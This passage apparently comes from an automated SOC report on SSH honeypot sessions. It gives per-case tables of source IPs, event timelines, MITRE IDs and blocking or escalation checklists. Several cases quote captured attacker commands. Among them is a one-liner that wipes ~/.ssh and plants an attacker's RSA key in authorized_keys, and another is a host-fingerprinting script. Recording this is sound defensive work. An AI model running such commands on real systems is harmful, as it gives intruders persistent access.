| `2026-10-07 03:37:58` | `cowrie.session.connect` |
| `2026-10-07 03:37:59` | `cowrie.client.version` |
| `2026-10-07 03:37:59` | `cowrie.client.kex` |
| `2026-10-07 03:38:01` | `cowrie.login.success` |
| `2026-10-07 03:38:02` | `cowrie.direct-tcpip.request` |
| `2026-10-07 03:38:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.221.158[.]216` to AbuseIPDB if not already reported
- [ ] Block `211.221.158[.]216` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcaee7931815

| Field | Detail |
|---|---|
| **Source IP** | `36.50.134[.]86` |
| **First Seen** | 2026-10-07 03:41 |
| **Last Seen** | 2026-10-07 03:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 03:41:03` | `cowrie.session.connect` |
| `2026-10-07 03:41:04` | `cowrie.login.success` |
| `2026-10-07 03:41:05` | `cowrie.session.params` |
| `2026-10-07 03:41:05` | `cowrie.command.input` |
| `2026-10-07 03:41:05` | `cowrie.command.input` |
| `2026-10-07 03:41:06` | `cowrie.command.input` |
| `2026-10-07 03:41:07` | `cowrie.command.input` |
| `2026-10-07 03:41:07` | `cowrie.command.failed` |
| `2026-10-07 03:41:07` | `cowrie.log.closed` |
| `2026-10-07 03:41:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.50.134[.]86` to AbuseIPDB if not already reported
- [ ] Block `36.50.134[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cbf641995db

| Field | Detail |
|---|---|
| **Source IP** | `158.173.89[.]50` |
| **First Seen** | 2026-10-07 03:58 |
| **Last Seen** | 2026-10-07 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 03:58:08` | `cowrie.session.connect` |
| `2026-10-07 03:58:08` | `cowrie.client.version` |
| `2026-10-07 03:58:08` | `cowrie.client.kex` |
| `2026-10-07 03:58:08` | `cowrie.login.success` |
| `2026-10-07 03:58:08` | `cowrie.direct-tcpip.request` |
| `2026-10-07 03:58:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-10-07 03:58:08` | `cowrie.direct-tcpip.data` |
| `2026-10-07 03:58:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.173.89[.]50` to AbuseIPDB if not already reported
- [ ] Block `158.173.89[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-390ce43f69c4

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-07 04:01 |
| **Last Seen** | 2026-10-07 04:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 04:01:07` | `cowrie.session.connect` |
| `2026-10-07 04:01:07` | `cowrie.client.version` |
| `2026-10-07 04:01:07` | `cowrie.client.kex` |
| `2026-10-07 04:01:08` | `cowrie.login.success` |
| `2026-10-07 04:01:08` | `cowrie.direct-tcpip.request` |
| `2026-10-07 04:01:08` | `cowrie.direct-tcpip.data` |
| `2026-10-07 04:01:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8e4a838eff8

| Field | Detail |
|---|---|
| **Source IP** | `211.95.159[.]159` |
| **First Seen** | 2026-10-07 04:08 |
| **Last Seen** | 2026-10-07 04:08 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 04:08:27` | `cowrie.session.connect` |
| `2026-10-07 04:08:27` | `cowrie.client.version` |
| `2026-10-07 04:08:28` | `cowrie.client.kex` |
| `2026-10-07 04:08:41` | `cowrie.login.success` |
| `2026-10-07 04:08:42` | `cowrie.session.params` |
| `2026-10-07 04:08:42` | `cowrie.command.input` |
| `2026-10-07 04:08:42` | `cowrie.command.failed` |
| `2026-10-07 04:08:42` | `cowrie.log.closed` |
| `2026-10-07 04:08:43` | `cowrie.session.params` |
| `2026-10-07 04:08:43` | `cowrie.command.input` |
| `2026-10-07 04:08:43` | `cowrie.session.file_download` |
| `2026-10-07 04:08:43` | `cowrie.log.closed` |
| `2026-10-07 04:08:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.95.159[.]159` to AbuseIPDB if not already reported
- [ ] Block `211.95.159[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dea1ffff93d4

| Field | Detail |
|---|---|
| **Source IP** | `211.95.159[.]159` |
| **First Seen** | 2026-10-07 04:08 |
| **Last Seen** | 2026-10-07 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 04:08:44` | `cowrie.session.connect` |
| `2026-10-07 04:08:44` | `cowrie.client.version` |
| `2026-10-07 04:08:44` | `cowrie.client.kex` |
| `2026-10-07 04:08:45` | `cowrie.login.success` |
| `2026-10-07 04:08:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.95.159[.]159` to AbuseIPDB if not already reported
- [ ] Block `211.95.159[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8732401a5c09

| Field | Detail |
|---|---|
| **Source IP** | `106.75.214[.]209` |
| **First Seen** | 2026-10-07 04:15 |
| **Last Seen** | 2026-10-07 04:20 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 04:15:30` | `cowrie.session.connect` |
| `2026-10-07 04:15:30` | `cowrie.client.version` |
| `2026-10-07 04:15:31` | `cowrie.client.kex` |
| `2026-10-07 04:15:32` | `cowrie.login.success` |
| `2026-10-07 04:15:33` | `cowrie.session.params` |
| `2026-10-07 04:15:33` | `cowrie.command.input` |
| `2026-10-07 04:15:33` | `cowrie.command.failed` |
| `2026-10-07 04:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.214[.]209` to AbuseIPDB if not already reported
- [ ] Block `106.75.214[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40275c507a09

| Field | Detail |
|---|---|
| **Source IP** | `152.32.188[.]136` |
| **First Seen** | 2026-10-07 04:15 |
| **Last Seen** | 2026-10-07 04:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 04:15:46` | `cowrie.session.connect` |
| `2026-10-07 04:15:46` | `cowrie.client.version` |
| `2026-10-07 04:15:46` | `cowrie.client.kex` |
| `2026-10-07 04:15:47` | `cowrie.login.success` |
| `2026-10-07 04:15:49` | `cowrie.session.params` |
| `2026-10-07 04:15:49` | `cowrie.command.input` |
| `2026-10-07 04:15:49` | `cowrie.command.failed` |
| `2026-10-07 04:15:49` | `cowrie.log.closed` |
| `2026-10-07 04:15:50` | `cowrie.session.params` |
| `2026-10-07 04:15:50` | `cowrie.command.input` |
| `2026-10-07 04:15:50` | `cowrie.session.file_download` |
| `2026-10-07 04:15:50` | `cowrie.log.closed` |
| `2026-10-07 04:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.188[.]136` to AbuseIPDB if not already reported
- [ ] Block `152.32.188[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01cadbec8ea2

| Field | Detail |
|---|---|
| **Source IP** | `152.32.188[.]136` |
| **First Seen** | 2026-10-07 04:15 |
| **Last Seen** | 2026-10-07 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 04:15:50` | `cowrie.session.connect` |
| `2026-10-07 04:15:50` | `cowrie.client.version` |
| `2026-10-07 04:15:51` | `cowrie.client.kex` |
| `2026-10-07 04:15:52` | `cowrie.login.success` |
| `2026-10-07 04:15:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.188[.]136` to AbuseIPDB if not already reported
- [ ] Block `152.32.188[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cecf6fc1bd97

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-10-07 04:17 |
| **Last Seen** | 2026-10-07 04:18 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 04:17:41` | `cowrie.session.connect` |
| `2026-10-07 04:17:41` | `cowrie.client.version` |
| `2026-10-07 04:17:41` | `cowrie.client.kex` |
| `2026-10-07 04:17:45` | `cowrie.login.success` |
| `2026-10-07 04:17:47` | `cowrie.session.params` |
| `2026-10-07 04:17:47` | `cowrie.command.input` |
| `2026-10-07 04:17:47` | `cowrie.command.input` |
| `2026-10-07 04:17:47` | `cowrie.command.input` |
| `2026-10-07 04:17:47` | `cowrie.command.input` |
| `2026-10-07 04:17:47` | `cowrie.command.input` |
| `2026-10-07 04:17:47` | `cowrie.command.success` |
| `2026-10-07 04:17:47` | `cowrie.command.input` |
| `2026-10-07 04:17:47` | `cowrie.command.input` |
| `2026-10-07 04:17:47` | `cowrie.command.input` |
| `2026-10-07 04:17:47` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdccd72c8701

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]6` |
| **First Seen** | 2026-10-07 04:22 |
| **Last Seen** | 2026-10-07 04:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 04:22:01` | `cowrie.session.connect` |
| `2026-10-07 04:22:01` | `cowrie.client.version` |
| `2026-10-07 04:22:01` | `cowrie.client.kex` |
| `2026-10-07 04:22:03` | `cowrie.login.success` |
| `2026-10-07 04:22:04` | `cowrie.direct-tcpip.request` |
| `2026-10-07 04:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]6` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7008cf2ccf32

| Field | Detail |
|---|---|
| **Source IP** | `82.65.140[.]218` |
| **First Seen** | 2026-10-07 04:22 |
| **Last Seen** | 2026-10-07 04:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-07 04:22:13` | `cowrie.session.connect` |
| `2026-10-07 04:22:13` | `cowrie.client.version` |
| `2026-10-07 04:22:13` | `cowrie.client.kex` |
| `2026-10-07 04:22:14` | `cowrie.login.success` |
| `2026-10-07 04:22:14` | `cowrie.direct-tcpip.request` |
| `2026-10-07 04:22:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.65.140[.]218` to AbuseIPDB if not already reported
- [ ] Block `82.65.140[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (172) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-26c83b7bffcc | HIGH | `203.92.36[.]109` | 2026-10-07 04:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-406bd40820b8 | HIGH | `36.92.35[.]211` | 2026-10-07 04:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-10af5724aa9f | HIGH | `64.62.156[.]52` | 2026-10-07 04:46 | Y | 3 | 0 | `T1078` |
| IR-d924e656063d | HIGH | `103.143.72[.]165` | 2026-10-07 04:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d3f2dd8fa7a7 | HIGH | `103.143.72[.]165` | 2026-10-07 04:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-baa7e09aa217 | HIGH | `104.28.214[.]112` | 2026-10-07 04:52 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b2faeb362962 | HIGH | `104.28.214[.]112` | 2026-10-07 04:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f915740bcc39 | HIGH | `120.136.25[.]236` | 2026-10-07 04:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b8f973657458 | HIGH | `177.135.206[.]10` | 2026-10-07 04:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4f669aee4a57 | HIGH | `61.184.128[.]210` | 2026-10-07 05:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e53563105919 | HIGH | `23.30.11[.]253` | 2026-10-07 05:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-61621bb17d03 | HIGH | `152.52.15[.]213` | 2026-10-07 05:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-62317b7f6e8b | HIGH | `152.52.15[.]213` | 2026-10-07 05:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-abd972ec6de4 | HIGH | `115.190.192[.]114` | 2026-10-07 05:13 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ccc971685665 | HIGH | `115.190.192[.]114` | 2026-10-07 05:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d0e6b7297efb | HIGH | `122.187.229[.]12` | 2026-10-07 05:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ab9141fbadef | HIGH | `46.59.88[.]232` | 2026-10-07 05:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b4fc32e9697c | HIGH | `102.220.163[.]98` | 2026-10-07 05:22 | Y | 1 | 0 | `T1078 · T1592` |
| IR-384e6f7c37f5 | HIGH | `102.220.163[.]98` | 2026-10-07 05:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e33c3bd13945 | HIGH | `115.190.229[.]117` | 2026-10-07 05:31 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3a55289fe2b1 | HIGH | `103.67.78[.]178` | 2026-10-07 05:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-89aca2da55c8 | HIGH | `103.67.78[.]178` | 2026-10-07 05:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bd8c62577283 | HIGH | `58.208.84[.]103` | 2026-10-07 05:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d4b58f85f7ce | HIGH | `58.208.84[.]103` | 2026-10-07 05:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-070c19d5a1d0 | HIGH | `109.160.32[.]102` | 2026-10-07 05:33 | Y | 1 | 0 | `T1078 · T1592` |
| IR-eafc88c73638 | HIGH | `152.32.211[.]187` | 2026-10-07 05:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-888deca5850c | HIGH | `152.32.211[.]187` | 2026-10-07 05:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-235d5e95111c | HIGH | `61.171.100[.]124` | 2026-10-07 05:35 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f013b65119ee | HIGH | `61.171.100[.]124` | 2026-10-07 05:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-eabe303ff322 | HIGH | `109.160.32[.]102` | 2026-10-07 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-f163f01fac59 | HIGH | `110.25.107[.]25` | 2026-10-07 06:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1f805890c9fc | HIGH | `188.219.104[.]210` | 2026-10-07 06:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a90c23fba742 | HIGH | `88.249.195[.]23` | 2026-10-07 06:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e9a813ebbe0e | HIGH | `88.249.195[.]23` | 2026-10-07 06:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3fc81b70270c | HIGH | `74.118.81[.]174` | 2026-10-07 06:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-28f0ae350590 | HIGH | `74.118.81[.]174` | 2026-10-07 06:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f060a8b78728 | HIGH | `191.241.142[.]170` | 2026-10-07 06:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4a5ec6bf2932 | HIGH | `111.70.29[.]130` | 2026-10-07 06:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ce5394fdf43e | HIGH | `150.5.157[.]20` | 2026-10-07 06:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-aaad78a37a62 | HIGH | `150.5.157[.]20` | 2026-10-07 06:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-40ad59bd7cce | HIGH | `220.119.37[.]141` | 2026-10-07 06:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4486d96f7648 | HIGH | `220.119.37[.]141` | 2026-10-07 06:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ebf394b18c0f | HIGH | `187.212.17[.]164` | 2026-10-07 06:12 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5e6d6b21a27e | HIGH | `187.212.17[.]164` | 2026-10-07 06:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bbfea05319d7 | HIGH | `118.35.238[.]149` | 2026-10-07 06:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a882f140b63b | HIGH | `14.115.252[.]101` | 2026-10-07 06:22 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fdf8fd0ca20a | HIGH | `14.115.252[.]101` | 2026-10-07 06:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8ce4fca26e2f | HIGH | `14.194.128[.]158` | 2026-10-07 06:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e9557049d340 | HIGH | `122.176.23[.]166` | 2026-10-07 06:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7387b8143249 | HIGH | `65.181.71[.]117` | 2026-10-07 06:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ed0c06be6852 | HIGH | `65.181.71[.]117` | 2026-10-07 06:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d8f1cde48de2 | HIGH | `176.53.159[.]196` | 2026-10-07 06:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2159adf03046 | HIGH | `118.145.240[.]6` | 2026-10-07 07:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-cb34e2281378 | HIGH | `186.122.177[.]140` | 2026-10-07 07:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2365e7f22151 | HIGH | `186.122.177[.]140` | 2026-10-07 07:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f300bf5e835b | HIGH | `129.121.74[.]52` | 2026-10-07 07:23 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1df0ac8cf996 | HIGH | `129.121.74[.]52` | 2026-10-07 07:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-54e51d3e4d1c | HIGH | `129.121.94[.]183` | 2026-10-07 07:24 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-72231a176528 | HIGH | `129.121.94[.]183` | 2026-10-07 07:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-80904587cc36 | HIGH | `41.242.115[.]83` | 2026-10-07 07:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4badc9bc368f | HIGH | `41.242.115[.]83` | 2026-10-07 07:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c1df755c2d66 | HIGH | `101.96.230[.]94` | 2026-10-07 07:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3bf0f0b49df7 | HIGH | `101.96.230[.]94` | 2026-10-07 07:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-085bdf812a0d | HIGH | `59.125.252[.]50` | 2026-10-07 07:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-627ea6ccfa76 | HIGH | `93.118.170[.]197` | 2026-10-07 07:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4e716b5a91af | HIGH | `195.178.110[.]218` | 2026-10-07 07:40 | Y | 1 | 0 | `T1078 · T1592` |
| IR-3570a6713ccb | HIGH | `122.187.229[.]220` | 2026-10-07 07:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8ffa14658bba | HIGH | `193.112.192[.]91` | 2026-10-07 07:43 | Y | 1 | 0 | `T1078 · T1592` |
| IR-253d10dd482d | HIGH | `193.112.192[.]91` | 2026-10-07 07:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e58715635f88 | HIGH | `103.7.60[.]253` | 2026-10-07 07:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-64b8c8a471a8 | HIGH | `153.67.110[.]149` | 2026-10-07 07:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3ffdc50b4bae | HIGH | `34.78.103[.]39` | 2026-10-07 07:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-54e2742dac2a | HIGH | `2.28.13[.]214` | 2026-10-07 07:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-08c20245e3fb | HIGH | `130.12.180[.]51` | 2026-10-07 07:55 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-1a68843d831c | HIGH | `195.178.110[.]218` | 2026-10-07 08:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-ff4987df64c5 | HIGH | `103.248.120[.]6` | 2026-10-07 08:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8dbe431c2489 | HIGH | `103.248.120[.]6` | 2026-10-07 08:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-47b88a280be6 | HIGH | `102.220.163[.]98` | 2026-10-07 08:22 | Y | 1 | 0 | `T1078 · T1592` |
| IR-ae5825174af6 | HIGH | `102.220.163[.]98` | 2026-10-07 08:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b811e0fe1c7e | HIGH | `94.154.43[.]69` | 2026-10-07 08:27 | Y | 2 | 6 | `T1059.004 · T1078 · T1105` |
| IR-2f8a63852c15 | HIGH | `94.154.43[.]69` | 2026-10-07 08:35 | Y | 2 | 6 | `T1059.004 · T1078 · T1105` |
| IR-867767f33d5c | HIGH | `47.90.216[.]160` | 2026-10-07 08:54 | Y | 16 | 0 | `T1003.008 · T1021.004 · T1059.004` |
| IR-23d16797947d | HIGH | `195.178.110[.]227` | 2026-10-07 09:04 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-abad12bd25cc | HIGH | `123.54.215[.]74` | 2026-10-07 09:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fe732ffc1baf | HIGH | `123.54.215[.]74` | 2026-10-07 09:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5017b6ebf34c | HIGH | `220.123.33[.]105` | 2026-10-07 09:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-235aacdf5aa2 | HIGH | `220.123.33[.]105` | 2026-10-07 09:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-12a9b67fc0ea | HIGH | `119.96.158[.]87` | 2026-10-07 09:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-af94c70288e2 | HIGH | `119.96.158[.]87` | 2026-10-07 09:34 | Y | 0 | 0 | `T1078 · T1592` |
